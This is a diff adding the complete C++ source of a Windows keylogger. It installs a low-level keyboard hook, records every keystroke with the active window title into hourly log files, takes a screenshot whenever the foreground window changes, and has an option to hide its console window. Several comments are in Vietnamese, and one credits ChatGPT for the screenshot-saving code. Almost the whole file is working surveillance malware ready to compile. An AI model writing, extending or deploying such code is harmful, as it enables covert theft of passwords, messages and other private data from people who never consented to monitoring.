@@ -1,0 +1,343 @@
+﻿#define UNICODE
+#include <Windows.h>
+#include <cstring>
+#include <cstdio>
+#include <fstream>
+#include <iostream>
+#include <sstream>
+#include <time.h>
+#include <map>
+
+#define visible // (visible / invisible) Defines whether you want to enable or disable 
+
+#define bootwait // (bootwait / nowait) boot time waiting if running at system boot.
+
+#define FORMAT 0 // defines which format to use for logging: 0 for default, 10 for dec codes, 16 for hex codex
+
+#define mouseignore // defines if ignore mouseclicks
+
+
+// virtual key codes to string mapping for default format. useful for keys that do not have a printable representation (unikey for vietnamese).
+#if FORMAT == 0
+const std::map<int, std::string> keyname{
+	{VK_BACK, "[BACKSPACE]" },
+	{VK_RETURN,	"\n" },
+	{VK_SPACE,	"_" },
+	{VK_TAB,	"[TAB]" },
+	{VK_SHIFT,	"[SHIFT]" },
+	{VK_LSHIFT,	"[LSHIFT]" },
+	{VK_RSHIFT,	"[RSHIFT]" },
+	{VK_CONTROL,	"[CONTROL]" },
+	{VK_LCONTROL,	"[LCONTROL]" },
+	{VK_RCONTROL,	"[RCONTROL]" },
+	{VK_MENU,	"[ALT]" },
+	{VK_LWIN,	"[LWIN]" },
+	{VK_RWIN,	"[RWIN]" },
+	{VK_ESCAPE,	"[ESCAPE]" },
+	{VK_END,	"[END]" },
+	{VK_HOME,	"[HOME]" },
+	{VK_LEFT,	"[LEFT]" },
+	{VK_RIGHT,	"[RIGHT]" },
+	{VK_UP,		"[UP]" },
+	{VK_DOWN,	"[DOWN]" },
+	{VK_PRIOR,	"[PG_UP]" },
+	{VK_NEXT,	"[PG_DOWN]" },
+	{VK_OEM_PERIOD,	"." },
+	{VK_DECIMAL,	"." },
+	{VK_OEM_PLUS,	"+" },
+	{VK_OEM_MINUS,	"-" },
+	{VK_ADD,		"+" },
+	{VK_SUBTRACT,	"-" },
+	{VK_CAPITAL,	"[CAPSLOCK]" },
+};
+#endif
+
+// The hook handle. This is used to unhook and call the next hook in chain.
+HHOOK _hook;
+
+// This struct contains the data received by the hook callback. As you see in the callback function
+// it contains the thing you will need: vkCode = virtual key code.
+KBDLLHOOKSTRUCT kbdStruct;
+
+int Save(int key_stroke);
+std::ofstream output_file;
+
+char output_filename[32];
+int cur_hour = -1;
+
+// This is the callback function. Consider it the event that is raised when, in this case,
+// a key is pressed.
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode >= 0)
+	{
+		// the action is valid: HC_ACTION.
+		if (wParam == WM_KEYDOWN)
+		{
+			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+
+			// save to file
+			Save(kbdStruct.vkCode);
+		}
+	}
+
+	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
+	return CallNextHookEx(_hook, nCode, wParam, lParam);
+}
+
+void SetHook()
+{
+	// Set the hook and set it to use the callback function above
+	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
+	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
+	// function that sets and releases the hook.
+	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+	{
+		LPCWSTR a = L"Failed to install hook!";
+		LPCWSTR b = L"Error";
+		MessageBox(NULL, a, b, MB_ICONERROR);
+	}
+}
+
+void ReleaseHook()
+{
+	UnhookWindowsHookEx(_hook);
+}
+
+void TakeScreenshot()
+{
+	// Lấy DC của màn hình
+	HDC hdcScreen = GetDC(NULL);
+	HDC hdcMem = CreateCompatibleDC(hdcScreen);
+
+	// Lấy kích thước màn hình
+	int width = GetSystemMetrics(SM_CXSCREEN);
+	int height = GetSystemMetrics(SM_CYSCREEN);
+
+	// Tạo bitmap
+	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+ 	SelectObject(hdcMem, hBitmap);
+	BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
+
+	// Lưu bitmap thành file
+	char filename[MAX_PATH];
+	time_t now = time(NULL);
+	struct tm tm_info;
+	localtime_s(&tm_info, &now);
+	strftime(filename, sizeof(filename), "screenshot_%Y-%m-%d_%H-%M-%S.bmp", &tm_info);
+
+	// Code để lưu bitmap (ChatGPT làm đoạn này)
+	// --- CODE MỚI: LƯU BITMAP ---
+	BITMAPFILEHEADER bfHeader;
+	BITMAPINFOHEADER biHeader;
+	BITMAPINFO bInfo;
+	HANDLE hFile = NULL;
+	DWORD dwSizeofDIB = 0, dwByteWritten = 0;
+	char* lpbitmap = NULL;
+	DWORD dwSizeofBMP = 0;
+
+	// Khởi tạo thông tin bitmap
+	ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+	ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+
+	// Thiết lập header
+	bfHeader.bfType = 0x4D42; // "BM"
+	bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+	biHeader.biSize = sizeof(BITMAPINFOHEADER);
+	biHeader.biWidth = width;
+	biHeader.biHeight = height;
+	biHeader.biPlanes = 1;
+	biHeader.biBitCount = 24;
+	biHeader.biCompression = BI_RGB;
+	biHeader.biSizeImage = 0;
+	biHeader.biXPelsPerMeter = 0;
+	biHeader.biYPelsPerMeter = 0;
+	biHeader.biClrUsed = 0;
+	biHeader.biClrImportant = 0;
+
+	bInfo.bmiHeader = biHeader;
+
+	// Tính kích thước bitmap
+	dwSizeofBMP = ((width * biHeader.biBitCount + 31) / 32) * 4 * height;
+
+	// Cấp phát bộ nhớ
+	lpbitmap = new char[dwSizeofBMP];
+
+	// Lấy dữ liệu bitmap
+	GetDIBits(hdcScreen, hBitmap, 0, height, lpbitmap, &bInfo, DIB_RGB_COLORS);
+
+	// Tạo file
+	hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		// Ghi file header
+		bfHeader.bfSize = dwSizeofBMP + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+		WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwByteWritten, NULL);
+
+		// Ghi info header
+		WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwByteWritten, NULL);
+
+		// Ghi dữ liệu bitmap
+		WriteFile(hFile, lpbitmap, dwSizeofBMP, &dwByteWritten, NULL);
+
+		// Đóng file
+		CloseHandle(hFile);
+	}
+
+	// Giải phóng bộ nhớ
+	delete[] lpbitmap;
+	// --- KẾT THÚC CODE MỚI ---
+
+	// Giải phóng resource
+	DeleteObject(hBitmap);
+	DeleteDC(hdcMem);
+	ReleaseDC(NULL, hdcScreen);
+}
+
+
+int Save(int key_stroke)
+{
+	std::stringstream output;
+	static char lastwindow[256] = "";
+#ifndef mouseignore 
+	if ((key_stroke == 1) || (key_stroke == 2))
+	{
+		return 0; // ignore mouse clicks
+	}
+#endif
+	HWND foreground = GetForegroundWindow();
+	DWORD threadID;
+	HKL layout = NULL;
+
+	// get time
+	struct tm tm_info;
+	const time_t t = time(NULL);
+	localtime_s(&tm_info, &t);
+
+	if (foreground)
+	{
+		// get keyboard layout of the thread
+		threadID = GetWindowThreadProcessId(foreground, NULL);
+		layout = GetKeyboardLayout(threadID);
+	}
+
+	if (foreground)
+	{
+		char window_title[256];
+		GetWindowTextA(foreground, (LPSTR)window_title, 256);
+
+		if (strcmp(window_title, lastwindow) != 0)
+		{
+			TakeScreenshot();
+			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+			char s[64];
+			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
+			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
+		}
+	}
+
+#if FORMAT == 10
+	output << '[' << key_stroke << ']';
+#elif FORMAT == 16
+	output << std::hex << "[" << key_stroke << ']';
+#else
+	if (keyname.find(key_stroke) != keyname.end())
+	{
+		output << keyname.at(key_stroke);
+	}
+	else
+	{
+		char key;
+		// check caps lock
+		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+		// check shift key
+		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+		{
+			lowercase = !lowercase;
+		}
+
+		// map virtual key according to keyboard layout
+		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+
+		// tolower converts it to lowercase properly
+		if (!lowercase)
+		{
+			key = tolower(key);
+		}
+		output << char(key);
+	}
+#endif
+	// Determine current hour and base log file on that
+	// To avoid massive single logfile
+	if (cur_hour != tm_info.tm_hour) {
+		cur_hour = tm_info.tm_hour;
+		output_file.close();
+		strftime(output_filename, sizeof(output_filename), "%Y-%m-%d__%H-%M-%S.log", &tm_info);
+		output_file.open(output_filename, std::ios_base::app);
+		std::cout << "Logging output to " << output_filename << std::endl;
+	}
+
+	// instead of opening and closing file handlers every time, keep file open and flush.
+	output_file << output.str();
+	output_file.flush();
+
+	std::cout << output.str();
+
+	return 0;
+}
+void Stealth()
+{
+#ifdef visible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+#endif
+
+#ifdef invisible
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
+#endif
+}
+
+// Function to check if the system is still booting up
+bool IsSystemBooting()
+{
+	// A workaround fix for missing definition of SM_SYSTEMDOCKED
+	//	return GetSystemMetrics(0x2004) != 0;
+	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
+}
+
+int main()
+{
+	// Call the visibility of window function.
+	Stealth();
+
+	// Check if the system is still booting up
+#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
+	while (IsSystemBooting())
+	{
+		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
+		Sleep(10000); // Wait for 10 seconds before checking again
+	}
+#endif
+#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
+	std::cout << "Skipping boot metrics check.\n";
+#endif
+
+	// This part of the program is reached once the system has 
+	// finished booting up aka when the while loop is broken 
+	// with the correct returned value.
+
+	// Call the hook function and set the hook.
+	SetHook();
+
+	// We need a loop to keep the console application running.
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+	}
+}
